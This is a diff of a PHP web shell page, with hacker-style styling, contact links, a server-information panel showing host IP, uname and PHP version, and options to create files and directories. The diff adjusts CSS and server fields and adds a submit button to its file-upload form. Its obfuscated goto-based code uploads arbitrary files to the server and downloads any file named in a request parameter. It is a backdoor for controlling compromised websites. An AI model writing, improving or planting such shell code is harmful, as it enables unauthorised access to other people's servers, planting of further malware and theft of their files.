@@ -60,8 +60,8 @@ textarea {
 }
 button, input {
 border: 2px solid #31ed06;
-border-radius: 0.5rem;
-font-size: 17px;
+border-radius: 5px;
+font-size: 16px;
 color:white;
 line-height: normal;
 font-family: inherit;
@@ -100,15 +100,16 @@ color: lime!important;
 <a href="https://wa.me/6281270303335" class="fa fa-whatsapp"></a>
 <a href="https://t.me/combetohct" class="fa fa-telegram"></a> 
 </div>
-<li>Server IP : <span style="color: white;"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></span></li>
+<li>Server IP : <span style="color: white;"><?php echo gethostbyname($_SERVER['SERVER_NAME']); ?></span></li>
 <li>Server : <span style="color: white;"><?php echo php_uname(); ?></span></li>
-<li>Server Software : <span style="color: white;"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></span></li>
-<li>Server Name : <span style="color: white;"><?php echo $_SERVER['SERVER_NAME']; ?></span></li>
+<li>Server Software : <span style="color: white;"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></li>
+<li>Server Name : <span style="color: white;"><?php echo $_SERVER['HTTP_HOST']; ?></span></li>
 <li>PHP Version : <span style="color: white;"><?php echo phpversion(); ?></span></li>
 <li>Add File : <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>" class="ohct">Submit</a></li>
 <li>Add Directory : <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>" class="ohct">Submit</a></li>
 <li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
-<input type="file" name="f[]" onchange="this.form.submit()" multiple>
+<input type="file" name="f[]" multiple>
+<input type="submit" style="padding-left: 1rem;padding-right: 1rem;padding-top: 3px;padding-bottom: 3px;border-radius: 5px;background-color: black;font-family: inherit;font-size: 16px;" value="Submit" name="submit">
 <?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?> 
 </form></li>
 </div>
